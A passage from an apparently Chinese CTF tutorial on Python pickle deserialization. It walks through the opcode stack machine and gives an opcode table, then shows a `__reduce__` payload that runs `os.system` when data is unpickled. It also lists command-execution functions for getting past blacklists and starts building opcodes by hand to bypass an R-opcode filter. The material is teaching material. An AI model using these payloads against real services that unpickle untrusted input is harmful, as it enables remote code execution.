src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912114741.png" alt="image-20200912114741579"></p> <p>接下来是<code>\x81</code>操作符，会进行的操作是：<strong>从栈中弹出一个元素，记为<code>args</code>；再弹出一个元素，记为<code>cls</code>，并执行<code>cls.__new__(cls, *args)</code>，然后把得到的东西压入当前栈。</strong></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912130151.png" alt="image-20200912130144662"></p> <p>PVM把我们之前压入栈中的两个字符串分别作为两个参数，使用<code>__new__</code>方法形成了一个新的对象。<strong>所以到现在为止，当前栈中的元素只有一个实例化的pickle_test类，而该实例中什么都没有。因为初始化的时候，tuple是一个空的元组。</strong></p> <p>接下来是<code>}</code>操作符，<strong>它会将一个空的字典压入栈中。</strong></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912130448.png" alt="image-20200912130415334"></p> <p>然后是<code>(</code>，它是<code>MARK</code>操作符，会进行下面的操作：<strong>把现在当前栈中的东西打包成一个列表，然后整体压进前序栈，最后清空当前栈。</strong></p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912131517.png" alt="image-20200912131517410"></p> <blockquote><p>还记得前文中所说的吗？<strong>当前栈用来处理python运行过程中最顶层的信息，而前序栈更像是一个缓冲区，用来处理下层的信息。</strong></p></blockquote> <p>现在当前栈为空，而前序栈中存放了一个打包好的列表，接下来的操作依然会再当前栈中进行。</p> <p>接着是<code>X</code>操作符，**它的作用是把一个uft-8编码的字符串压进栈中。**然后是<code>J</code>操作符，**它的作用是把一个四字节的int类型的整数压入栈中。**然后又执行了两次X操作符。</p> <p>所以在执行完上述4步之后，当前栈可以用下图表示：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912133248.png" alt="image-20200912133248762"></p> <p>然后是<code>u</code>操作符，它做的事情比较多：</p> <ul><li><p>执行<code>pop_mark</code>，把当前栈的内容打包成一个列表<code>list</code>，然后把当前栈的状态恢复到执行<code>MARK</code>操作符之前。</p></li> <li><p>拿到当前栈的最后的元素，并且规定该元素必须是一个空的字典。然后一组一组地读<code>list</code>中的元素，前者作为key，后者作为value，存放进那个空字典当中。</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912134958.png" alt=""></p></li></ul> <p>执行完这个相对复杂的操作之后，当前栈中的元素为<strong>一个存放有元素的字典、一个实例化的pickle_test类。</strong></p> <p>下一个操作符是<code>b</code>，它做的事情称为<code>BUILD</code>:</p> <ul><li>把当前栈的栈顶元素存入内存，记为<code>state</code>，然后弹出栈。</li> <li>再把当前栈的栈顶元素记为<code>topele</code>，然后弹出栈。</li> <li>用<code>state</code>来初始化实例<code>topele</code>，然后把得到的实例放进当前栈中。</li></ul> <blockquote><p>python官方文档中称上述的操作为<em>实例的解封。</em></p> <p>······</p> <p>解封过程</p> <p>当解封时，如果类定义了__setstate__()，就会在已解封的状态下调用它。此时不要求实例的 state 对象必须是 dict。没有定义此方法的话，先前封存的 state 对象必须是 dict，且该 dict 内容会在解封时赋给新实例的__dict__。</p></blockquote> <p>我们在定义<code>pickle_test</code>类的时候并没有定义<code>__setstate__()</code>方法，所以在执行初始化操作的时候，得到的<code>dict</code>会赋值给<code>pickle_test</code>实例的<code>__dict__</code>。</p> <p>此时的当前栈：</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912142534.png" alt="image-20200912142534782"></p> <p>再执行完<code>b</code>操作符后，PVM引擎遇到了<code>.</code>号，还记得我们上文中所说过的吗？</p> <blockquote><p>解析引擎：从二进制流中读取opcode和参数，并对其进行解释处理，直至遇到<code>.</code>号为止，最终停留在栈顶的值将被作为反序列化的值返回。</p></blockquote> <p><strong>所以最后一步，反序化操作完成，已经初始化好的对象作为当前栈栈顶的元素被作为反序列化的值。</strong></p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> pickletools

<span class="token keyword">class</span> <span class="token class-name">pickle_test</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20200911</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;F4de&quot;</span>

a <span class="token operator">=</span> pickle_test<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 序列化对象</span>
s <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
<span class="token comment"># 进行优化</span>
s <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
obj <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>__dict__<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912143304.png" alt="image-20200912143304192"></p> <h2 id="opcode：我有不同的版本"><a href="#opcode：我有不同的版本" class="header-anchor">#</a> opcode：我有不同的版本</h2> <blockquote><p><strong>opcode：即pickle序列化完成后得到的字符串。</strong></p> <p><strong>python3和python2得到的opcode是不相同的，以下实例均在python3环境下运行。</strong></p></blockquote> <p>在python3中，opcode共有6种不同的版本，可以在<code>dumps()</code>方法中使用<code>protocol</code>参数来指定opcode的版本：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> pickletools

<span class="token keyword">class</span> <span class="token class-name">pickle_test</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20200911</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">&quot;F4de&quot;</span>

a <span class="token operator">=</span> pickle_test<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 序列化对象</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">,</span> protocol<span class="token operator">=</span>i<span class="token punctuation">)</span>
    <span class="token comment"># 进行优化</span>
    s <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'opcode版本：{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200911215904.png" alt="image-20200911215904673"></p> <p>opcode是向下兼容的，其中第零个版本是最容易阅读和构造的，所以在下面的沙箱逃逸的opcode构造过程中，我们均选用0版本的opocde来构造payload。</p> <h2 id="常用opcode含义表（0版本）"><a href="#常用opcode含义表（0版本）" class="header-anchor">#</a> 常用opcode含义表（0版本）</h2> <table><thead><tr><th>opcode</th> <th>描述</th> <th>具体写法</th> <th>栈上的变化</th> <th>memo上的变化</th></tr></thead> <tbody><tr><td>c</td> <td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）</td> <td>c[module]\n[instance]\n</td> <td>获得的对象入栈</td> <td>无</td></tr> <tr><td>o</td> <td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td> <td>o</td> <td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td> <td>无</td></tr> <tr><td>i</td> <td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td> <td>i[module]\n[callable]\n</td> <td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td> <td>无</td></tr> <tr><td>N</td> <td>实例化一个None</td> <td>N</td> <td>获得的对象入栈</td> <td>无</td></tr> <tr><td>S</td> <td>实例化一个字符串对象</td> <td>S'xxx'\n（也可以使用双引号、'等python字符串形式）</td> <td>获得的对象入栈</td> <td>无</td></tr> <tr><td>V</td> <td>实例化一个UNICODE字符串对象</td> <td>Vxxx\n</td> <td>获得的对象入栈</td> <td>无</td></tr> <tr><td>I</td> <td>实例化一个int对象</td> <td>Ixxx\n</td> <td>获得的对象入栈</td> <td>无</td></tr> <tr><td>F</td> <td>实例化一个float对象</td> <td>Fx.x\n</td> <td>获得的对象入栈</td> <td>无</td></tr> <tr><td>R</td> <td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td> <td>R</td> <td>函数和参数出栈，函数的返回值入栈</td> <td>无</td></tr> <tr><td>.</td> <td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td> <td>.</td> <td>无</td> <td>无</td></tr> <tr><td>(</td> <td>向栈中压入一个MARK标记</td> <td>(</td> <td>MARK标记入栈</td> <td>无</td></tr> <tr><td>t</td> <td>寻找栈中的上一个MARK，并组合之间的数据为元组</td> <td>t</td> <td>MARK标记以及被组合的数据出栈，获得的对象入栈</td> <td>无</td></tr> <tr><td>)</td> <td>向栈中直接压入一个空元组</td> <td>)</td> <td>空元组入栈</td> <td>无</td></tr> <tr><td>l</td> <td>寻找栈中的上一个MARK，并组合之间的数据为列表</td> <td>l</td> <td>MARK标记以及被组合的数据出栈，获得的对象入栈</td> <td>无</td></tr> <tr><td>]</td> <td>向栈中直接压入一个空列表</td> <td>]</td> <td>空列表入栈</td> <td>无</td></tr> <tr><td>d</td> <td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td> <td>d</td> <td>MARK标记以及被组合的数据出栈，获得的对象入栈</td> <td>无</td></tr> <tr><td>}</td> <td>向栈中直接压入一个空字典</td> <td>}</td> <td>空字典入栈</td> <td>无</td></tr> <tr><td>p</td> <td>将栈顶对象储存至memo_n</td> <td>pn\n</td> <td>无</td> <td>对象被储存</td></tr> <tr><td>g</td> <td>将memo_n的对象压栈</td> <td>gn\n</td> <td>对象被压栈</td> <td>无</td></tr> <tr><td>0</td> <td>丢弃栈顶对象</td> <td>0</td> <td>栈顶对象被丢弃</td> <td>无</td></tr> <tr><td>b</td> <td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td> <td>b</td> <td>栈上第一个元素出栈</td> <td>无</td></tr> <tr><td>s</td> <td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td> <td>s</td> <td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td> <td>无</td></tr> <tr><td>u</td> <td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td> <td>u</td> <td>MARK标记以及被组合的数据出栈，字典被更新</td> <td>无</td></tr> <tr><td>a</td> <td>将栈的第一个元素append到第二个元素(列表)中</td> <td>a</td> <td>栈顶元素出栈，第二个元素（列表）被更新</td> <td>无</td></tr> <tr><td>e</td> <td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td> <td>e</td> <td>MARK标记以及被组合的数据出栈，列表被更新</td> <td>无</td></tr></tbody></table> <p><strong>读者需要额外注意<code>(</code>操作符和<code>t</code>操作符，在后文中会经常利用这两个操作符来构造opcode。</strong></p> <blockquote><p>关于更多的操作符的解释，可以参考：https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py</p></blockquote> <h2 id="r操作符：危险的信号"><a href="#r操作符：危险的信号" class="header-anchor">#</a> R操作符：危险的信号</h2> <p>在CTF中，关于python反序列化，遇到最多的就是利用<code>__rudece__</code>来执行任意命令，现来看一段代码：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> pickletools

<span class="token keyword">class</span> <span class="token class-name">pickle_test</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>

a <span class="token operator">=</span> pickle_test<span class="token punctuation">(</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>

pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912145109.png" alt="image-20200912145109547"></p> <p>可以看到，在反序列化的时候执行了系统命令。我们可以通过分析它的opcode，看看反序列化的时候，PVM都干了什么事情：</p> <p><img src="https://i.loli.net/2020/09/20/yKNnLsRpYolWqMP.png" alt="image-20200920133123158"></p> <p>结合之前的解释，相信各位读者已经可以读懂这段<code>opcode</code>了，这里主要说一下<code>R</code>操作符，它的作用是：</p> <ul><li>把当前栈的栈顶元素记为<code>args</code>，然后弹出栈。</li> <li>把当前栈的栈顶元素记为<code>func</code>，然后弹出栈。</li> <li>以<code>args</code>作为参数（该参数必须是元组），执行<code>func</code>，把结果压进栈中。</li></ul> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200912150755.png" alt="image-20200912150755932"></p> <p><code>__ruduce__</code>会在反序列化的之后被执行，其底层的操作码就是<code>R</code>。所以我们可以利用<code>__ruduce__</code>生成恶意的opcode，然后当反序列化的时候会解释我们构造的opcode，从而达到恶意攻击效果。</p> <p>在题目中，经常会碰到利用黑名单ban掉<code>system</code>等等函数的情况，这种题目的<strong>通常</strong>解法就是寻找黑名单的漏网之鱼，下面是整理的一些常用的命令执行函数：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token builtin">execfile</span><span class="token punctuation">,</span> <span class="token builtin">compile</span><span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">,</span> <span class="token builtin">map</span><span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">,</span>
os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">,</span> os<span class="token punctuation">.</span>popen2<span class="token punctuation">,</span> os<span class="token punctuation">.</span>popen3<span class="token punctuation">,</span> os<span class="token punctuation">.</span>popen4<span class="token punctuation">,</span> os<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>pipe<span class="token punctuation">,</span>
os<span class="token punctuation">.</span>listdir<span class="token punctuation">,</span> os<span class="token punctuation">.</span>access<span class="token punctuation">,</span>
os<span class="token punctuation">.</span>execl<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execle<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execlp<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execlpe<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execv<span class="token punctuation">,</span>
os<span class="token punctuation">.</span>execve<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execvp<span class="token punctuation">,</span> os<span class="token punctuation">.</span>execvpe<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnl<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnle<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnlp<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnlpe<span class="token punctuation">,</span>
os<span class="token punctuation">.</span>spawnv<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnve<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnvp<span class="token punctuation">,</span> os<span class="token punctuation">.</span>spawnvpe<span class="token punctuation">,</span>
pickle<span class="token punctuation">.</span>load<span class="token punctuation">,</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">,</span>cPickle<span class="token punctuation">.</span>load<span class="token punctuation">,</span>cPickle<span class="token punctuation">.</span>loads<span class="token punctuation">,</span>
subprocess<span class="token punctuation">.</span>call<span class="token punctuation">,</span>subprocess<span class="token punctuation">.</span>check_call<span class="token punctuation">,</span>subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">,</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">,</span>
commands<span class="token punctuation">.</span>getstatusoutput<span class="token punctuation">,</span>commands<span class="token punctuation">.</span>getoutput<span class="token punctuation">,</span>commands<span class="token punctuation">.</span>getstatus<span class="token punctuation">,</span>
glob<span class="token punctuation">.</span>glob<span class="token punctuation">,</span>
linecache<span class="token punctuation">.</span>getline<span class="token punctuation">,</span>
shutil<span class="token punctuation">.</span>copyfileobj<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>copyfile<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>copy<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>copy2<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>move<span class="token punctuation">,</span>shutil<span class="token punctuation">.</span>make_archive<span class="token punctuation">,</span>
dircache<span class="token punctuation">.</span>listdir<span class="token punctuation">,</span>dircache<span class="token punctuation">.</span>opendir<span class="token punctuation">,</span>
io<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">,</span>
popen2<span class="token punctuation">.</span>popen2<span class="token punctuation">,</span>popen2<span class="token punctuation">.</span>popen3<span class="token punctuation">,</span>popen2<span class="token punctuation">.</span>popen4<span class="token punctuation">,</span>
timeit<span class="token punctuation">.</span>timeit<span class="token punctuation">,</span>timeit<span class="token punctuation">.</span>repeat<span class="token punctuation">,</span>
sys<span class="token punctuation">.</span>call_tracing<span class="token punctuation">,</span>
code<span class="token punctuation">.</span>interact<span class="token punctuation">,</span>code<span class="token punctuation">.</span>compile_command<span class="token punctuation">,</span>codeop<span class="token punctuation">.</span>compile_command<span class="token punctuation">,</span>
pty<span class="token punctuation">.</span>spawn<span class="token punctuation">,</span>
posixfile<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">,</span>posixfile<span class="token punctuation">.</span>fileopen<span class="token punctuation">,</span>
platform<span class="token punctuation">.</span>popen
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h2 id="c操作符：可以进行变量覆盖"><a href="#c操作符：可以进行变量覆盖" class="header-anchor">#</a> c操作符：可以进行变量覆盖</h2> <blockquote><p>在上文中提到的c操作符的作用是：<strong>连续往后读取两个字符串（每个字符串以\n结尾），第一个字符串记为moudle，第二个字符串记为name，并把moudle.name压进当前栈中</strong>。</p></blockquote> <p>其实c操作符是基于<code>find_class(moudle, name)</code>来实现的，<code>find_class()</code>函数实现的功能简单来说就是：去<code>moudle</code>模块中找到<code>name</code>。<strong>但是需要注意的是，moudle必须在name的顶层。</strong></p> <blockquote><p><strong>摘自python官方文档</strong></p> <p><code>find_class</code>(<em>module</em>, <em>name</em>)</p> <p>如有必要，导入 <em>module</em> 模块并返回其中名叫 <em>name</em> 的对象，其中 <em>module</em> 和 <em>name</em> 参数都是 <a href="https://docs.python.org/zh-cn/3/library/stdtypes.html#str" target="_blank" rel="noopener noreferrer"><code>str</code><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 对象。注意，不要被这个函数的名字迷惑， <a href="https://docs.python.org/zh-cn/3/library/pickle.html#pickle.Unpickler.find_class" target="_blank" rel="noopener noreferrer"><code>find_class()</code><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 同样可以用来导入函数。</p></blockquote> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Subclasses may override this.</span>
    sys<span class="token punctuation">.</span>audit<span class="token punctuation">(</span><span class="token string">'pickle.find_class'</span><span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
    <span class="token keyword">if</span> self<span class="token punctuation">.</span>proto <span class="token operator">&lt;</span> <span class="token number">3</span> <span class="token keyword">and</span> self<span class="token punctuation">.</span>fix_imports<span class="token punctuation">:</span>
    	<span class="token keyword">if</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token keyword">in</span> _compat_pickle<span class="token punctuation">.</span>NAME_MAPPING<span class="token punctuation">:</span>
        	module<span class="token punctuation">,</span> name <span class="token operator">=</span> _compat_pickle<span class="token punctuation">.</span>NAME_MAPPING<span class="token punctuation">[</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token keyword">elif</span> module <span class="token keyword">in</span> _compat_pickle<span class="token punctuation">.</span>IMPORT_MAPPING<span class="token punctuation">:</span>
            module <span class="token operator">=</span> _compat_pickle<span class="token punctuation">.</span>IMPORT_MAPPING<span class="token punctuation">[</span>module<span class="token punctuation">]</span>
    <span class="token builtin">__import__</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> level<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> self<span class="token punctuation">.</span>proto <span class="token operator">&gt;=</span> <span class="token number">4</span><span class="token punctuation">:</span>
    	<span class="token keyword">return</span> _getattribute<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>可以看下面这个示例demo：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> secret
<span class="token keyword">import</span> os
<span class="token keyword">import</span> base64

<span class="token keyword">class</span> <span class="token class-name">pickle_test</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'Demo'</span>
        self<span class="token punctuation">.</span>sign <span class="token operator">=</span> <span class="token string">'Hello'</span>

ser <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;input:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ser<span class="token punctuation">)</span>
<span class="token comment"># 过滤R操作符，防止危险函数</span>
<span class="token keyword">if</span> <span class="token string">b'R'</span> <span class="token keyword">in</span> ser<span class="token punctuation">:</span>
    os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    obj <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>ser<span class="token punctuation">)</span>

<span class="token keyword">if</span> obj<span class="token punctuation">.</span>name <span class="token operator">==</span> secret<span class="token punctuation">.</span>name <span class="token keyword">and</span> obj<span class="token punctuation">.</span>sign <span class="token operator">==</span> secret<span class="token punctuation">.</span>sign<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>secret<span class="token punctuation">.</span>flag<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Come on&quot;</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>demo中过滤了<code>R</code>操作符，无法执行<code>exec</code>函数完成变量覆盖，并且只有当反序列化后得到的对象的<code>name</code>和<code>sign</code>和<code>secret</code>模块中的<code>name</code>和<code>sign</code>相等才会返回flag。</p> <p><strong>对于这种情况，我们可以使用<code>c</code>操作符来进行变量覆盖</strong>，基本的思路就是，在初始化<code>pickle_test</code>对象的时候，利用<code>c</code>操作码来引入<code>secret</code>模块中的<code>name</code>和<code>sign</code>，再使用<code>b</code>操作码来进行BUILD。</p> <p>现在我们开始手动构造opcode：</p> <ol><li>首先需要引入<code>pickle_test</code>对象实例：<code>c__main__pickle_test\n)\x81</code></li> 